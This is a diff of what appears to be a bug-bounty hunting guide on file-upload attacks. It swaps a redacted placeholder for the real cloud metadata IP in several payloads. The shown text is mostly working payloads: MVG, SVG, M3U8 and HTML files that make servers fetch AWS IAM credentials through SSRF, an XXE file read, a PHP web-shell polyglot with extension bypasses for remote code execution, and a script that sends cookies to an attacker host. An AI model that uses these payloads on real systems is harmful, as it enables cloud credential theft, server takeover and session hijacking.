@@ -60,14 +60,14 @@ filename=shell.phtml, shell.pHp, shell.php5   → extension variants
 cat > /tmp/ssrf.mvg << 'EOF'
 push graphic-context
 viewbox 0 0 640 480
-fill 'url(http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/)'
+fill 'url(http://169.254.169.254/latest/meta-data/iam/security-credentials/)'
 pop graphic-context
 EOF
 
 # SVG SSRF (ImageMagick processes SVG remotely)
 cat > /tmp/ssrf.svg << 'EOF'
 <?xml version="1.0"?>
-<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://[REDACTED_IP]/latest/meta-data/">]>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
   <image xlink:href="http://COLLAB_HOST/imagemagick-ssrf" width="200" height="200"/>
 </svg>
@@ -85,7 +85,7 @@ cat > /tmp/ssrf.m3u8 << 'EOF'
 #EXTM3U
 #EXT-X-MEDIA-SEQUENCE:0
 #EXTINF:10.0,
-http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
 #EXT-X-ENDLIST
 EOF
 
@@ -108,10 +108,10 @@ EOF
 # Inject HTML that causes headless Chrome to fetch internal resources
 
 # SSRF via CSS import
-PAYLOAD='<html><head><style>@import url("http://[REDACTED_IP]/latest/meta-data/");</style></head><body>test</body></html>'
+PAYLOAD='<html><head><style>@import url("http://169.254.169.254/latest/meta-data/");</style></head><body>test</body></html>'
 
 # SSRF via HTML iframe
-PAYLOAD='<html><body><iframe src="http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/" width="1000" height="1000"></iframe></body></html>'
+PAYLOAD='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1000" height="1000"></iframe></body></html>'
 
 # Local file read
 PAYLOAD='<html><body><iframe src="file:///etc/passwd" width="1000" height="1000"></iframe></body></html>'
@@ -189,7 +189,7 @@ All 3 tests verify the skill is properly structured and ready for use.
 - **`hunt-rce`** — File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist → `GET /uploads/shell.phtml?c=id` → RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path → PHP object deserialization → RCE.
 - **`hunt-xxe`** — Office formats (DOCX/XLSX/PPTX), SVGs, and SOAP attachments are XML inside a ZIP — every upload-and-parse feature is a latent XXE candidate. Chain primitive: upload DOCX whose `[Content_Types].xml` or `word/document.xml` includes a parameter-entity DTD pointing at attacker-controlled DTD → blind XXE OOB file read → exfil `/etc/passwd` or `web.config` via the document parser.
 - **`hunt-xss`** — SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch('//attacker/?'+document.cookie)</script>` → victim views attachment at `app.target.com/uploads/x.svg` (same origin, not sandboxed) → cookie theft → ATO via session hijack.
-- **`hunt-ssrf`** — Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.
+- **`hunt-ssrf`** — Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` or ffmpeg `concat:http://internal/...` → SSRF to AWS IMDS → cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.
 - **`security-arsenal`** — Reach for the file-upload bypass tree: 10-row extension/MIME/magic-byte bypass table (double-ext, null-byte, case variants, `.phtml`/`.phar`/`.php5`/`.pht`, `.htaccess` upload to re-enable handlers, `web.config` upload on IIS), SVG/MVG/SVGZ payloads, DOCX-XXE templates, ZIP-slip path traversal in archives, polyglot generators.
 - **`triage-validation`** — Apply the Reproducibility Gate. A file successfully uploaded but never served, never executed, never parsed by anything is not a finding — it's a write-only blob. Critical RCE requires the actual `whoami` round-trip from the uploaded shell; stored XSS requires the popup firing in a victim browser, not just the file existing on disk.
 
